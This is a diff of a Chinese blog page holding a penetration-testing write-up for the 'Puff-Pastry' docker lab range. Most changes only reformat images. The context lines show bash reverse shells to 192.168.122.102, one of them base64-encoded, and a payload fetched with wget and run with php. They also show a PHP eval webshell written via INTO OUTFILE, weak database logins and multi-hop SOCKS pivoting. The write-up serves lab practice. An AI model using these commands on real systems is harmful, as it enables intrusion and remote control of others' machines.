@@ -12,8 +12,8 @@
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
-Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
-shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 |207 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 |522 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录
 "/>
 <meta name="keywords" content=""/>
 
@@ -35,8 +35,8 @@ shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知�
   <meta property="og:site_name" content="l1uyun">
   <meta property="og:title" content="Puff-Pastry打靶">
   <meta property="og:description" content="前言 在群里瞅见了这个靶机,没打过这种复杂环境的靶机,玩一下
-Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
-shiro 探测 java后端 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录">
+Puff-Pastry打靶记录 搭建 使用docker搭建,然后本地能够访问到一个8080端口 |207 这里我最开始是使用的Windows docker,后面改成了使用虚拟机
+shiro 探测 java后端 |522 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -269,19 +269,39 @@ function checkNightMode() {
 <h1 id="puff-pastry打靶记录">Puff-Pastry打靶记录</h1>
 <h2 id="搭建">搭建</h2>
 <p>使用docker搭建,然后本地能够访问到一个8080端口
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_1.png" alt="|207"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_1.png" alt="|207" /><figcaption>|207</figcaption></figure>
+
+
+
 这里我最开始是使用的Windows docker,后面改成了使用虚拟机</p>
 <h2 id="shiro">shiro</h2>
 <h3 id="探测">探测</h3>
 <p>java后端
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_2.png" alt="|522"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_2.png" alt="|522" /><figcaption>|522</figcaption></figure>
+
+
+
 进去只有一个登录框,在搭建过程中已经知道了第一台机器是shiro,选择记住密码,登录</p>
 <p>这里出现了shiro的特征 Cookie中存在rememberme字段
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_3.png" alt="|453"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_3.png" alt="|453" /><figcaption>|453</figcaption></figure>
+
+
+</p>
 <h3 id="shiro利用">shiro利用</h3>
 <p>直接上利用工具</p>
 <p>获取flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_4.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_4.png" alt="" /></figure>
+
+
+</p>
 <p>拿一个反弹shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
 </span></span><span style="display:flex;"><span>
@@ -347,7 +367,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>192.168.100.2 shiro
 </span></span><span style="display:flex;"><span>192.168.100.3 thinkphp
 </span></span></code></pre></div><p>现在的网络环境为
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_5.png" alt="|600"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
+
+
+</p>
 <p>接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
 </span></span><span style="display:flex;"><span>
@@ -378,20 +403,40 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">localIP</span> = <span style="color:#e6db74">&#34;192.168.110.3&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">localPort</span> = <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">remotePort</span> = <span style="color:#ae81ff">9999</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_6.png" alt=""  /></p>
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_6.png" alt="" /></figure>
+
+
+</p>
 <h2 id="thinkphp">thinkphp</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_7.png" alt="|486"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_7.png" alt="|486" /><figcaption>|486</figcaption></figure>
+
+
+</p>
 <p>网站主页提示了是thinkphp5,直接找到相关工具开始利用</p>
 <h3 id="利用">利用</h3>
 <p>检测漏洞
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_8.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_8.png" alt="" /></figure>
+
+
+
 拿shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
 </span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/a.sh
 </span></span><span style="display:flex;"><span>ls -al /tmp/a.sh
 </span></span><span style="display:flex;"><span>bash /tmp/a.sh
 </span></span></code></pre></div><p>但是这个shell好像弹不回来..换成php的试试
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_9.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_9.png" alt="" /></figure>
+
+
+
 成功拿到shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
 </span></span><span style="display:flex;"><span>php /tmp/ppp
@@ -499,7 +544,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>10.85.101.2 redis
 </span></span><span style="display:flex;"><span>10.85.101.1 ???  是运行docker的parrot???
 </span></span></code></pre></div><p>现在的环境为
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_10.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_10.png" alt="" /></figure>
+
+
+
 这里就直接配置个socks代理吧</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -511,9 +561,19 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">proxies</span>.<span style="color:#a6e22e">plugin</span>]
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> = <span style="color:#e6db74">&#34;socks5&#34;</span>
 </span></span></code></pre></div><p>配完之后
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_11.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_11.png" alt="" /></figure>
+
+
+
 配置一下proxychains
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_12.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_12.png" alt="" /></figure>
+
+
+</p>
 <h2 id="redis">redis</h2>
 <p>使用proxychains来实现使用代理</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
@@ -554,34 +614,94 @@ function checkNightMode() {
 <p>回到phpmyadmin
 弱口令进入后台</p>
 <pre tabindex="0"><code>localhost:root:root
-</code></pre><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_13.png" alt=""  /></p>
+</code></pre><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_13.png" alt="" /></figure>
+
+
+</p>
 <p>但是我进不去&hellip;.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_14.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_14.png" alt="" /></figure>
+
+
+
 重试了几遍,进去了</p>
 <p>拿到flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_15.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_15.png" alt="" /></figure>
+
+
+</p>
 <h3 id="into-outfile写入webshell">into-outfile写入webshell</h3>
 <p>尝试利用,这里去找了一下文章,<a href="https://www.zsblog.org/390.html" target="_blank" rel="noopener nofollow noreferrer" >PHPMyadmin-Mysql的Getshell姿势汇总 – 张三blog</a>
 先看看有没有权限写入文件,这里设置为空,没有限制
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_16.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_16.png" alt="" /></figure>
+
+
+
 这俩没啥用,直接猜是/var/www/html试试
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_17.png" alt=""  /> <img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_18.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_17.png" alt="" /></figure>
+
+
+ 
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_18.png" alt="" /></figure>
+
+
+
 写入webshell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt="" /></figure>
+
+
+
 获取一个webshell
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_20.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_20.png" alt="" /></figure>
+
+
+</p>
 <p>这个机器好像不出网&hellip;.尝试了几种payload,都拿不到shell,也不同wget访问我的攻击机.</p>
 <h3 id="蚁剑">蚁剑</h3>
 <p>网上搜了一下,看到有不出网环境下使用蚁剑的例子.</p>
 <p>用蚁剑看看
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_21.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_21.png" alt="" /></figure>
+
+
+
 拿到这个flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_22.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_22.png" alt="" /></figure>
+
+
+
 使用蚁剑的终端,来尝试反弹shell,但是还是不行,这好像是个不出网的环境&hellip;
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_23.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_23.png" alt="" /></figure>
+
+
+
 不过蚁剑带的文件上传功能能用
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_24.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_24.png" alt="" /></figure>
+
+
+</p>
 <h3 id="内网扫描-2">内网扫描</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
 </span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
@@ -597,7 +717,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>    inet 172.56.102.4/24 brd 172.56.102.255 scope global eth1
 </span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
 </span></span></code></pre></div><p>执行fscan之后,没有回显,但是有输出文件
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_25.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_25.png" alt="" /></figure>
+
+
+
 跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
 </span></span><span style="display:flex;"><span>172.56.102.4:80 open
@@ -622,7 +747,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>172.56.102.3   Postgres
 </span></span><span style="display:flex;"><span>172.56.102.2   struts2
 </span></span></code></pre></div><p>这里直接拿巨魔的拓扑图
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_26.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_26.png" alt="" /></figure>
+
+
+
 我现在需要再配置一个socks代理,服务器放在thinkphp机器上,客户端放在phpmyadmin机器上</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">phpmyadmin</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
@@ -635,7 +765,12 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">remotePort</span> = <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">proxies</span>.<span style="color:#a6e22e">plugin</span>]
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">type</span> = <span style="color:#e6db74">&#34;socks5&#34;</span>
-</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_27.png" alt=""  />
+</span></span></code></pre></div><p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_27.png" alt="" /></figure>
+
+
+
 然后在proxychains里面配置两个代理</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socks5 192.168.122.102 <span style="color:#ae81ff">9998</span>
 </span></span><span style="display:flex;"><span>socks5 10.85.101.4 <span style="color:#ae81ff">9998</span>
@@ -657,16 +792,41 @@ function checkNightMode() {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.89 seconds
 </span></span></code></pre></div><p>代理成功了,接下来需要在Windows上面也使用多重代理,这时候要上proxifier了.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_28.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_28.png" alt="" /></figure>
+
+
+
 配置完之后,成功访问Struts服务器.
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_29.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_29.png" alt="" /></figure>
+
+
+</p>
 <h2 id="struts">Struts</h2>
 <p>漏洞存在
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_30.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_30.png" alt="" /></figure>
+
+
+
 执行命令
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_31.png" alt=""  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_31.png" alt="" /></figure>
+
+
+
 获取flag
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_32.png" alt=""  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_32.png" alt="" /></figure>
+
+
+</p>
 <h2 id="postgres">Postgres</h2>
 <p>之前fscan扫出来的弱口令
 <code>[+] Postgres:172.56.102.3:5432:postgres password</code></p>
@@ -877,7 +1037,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
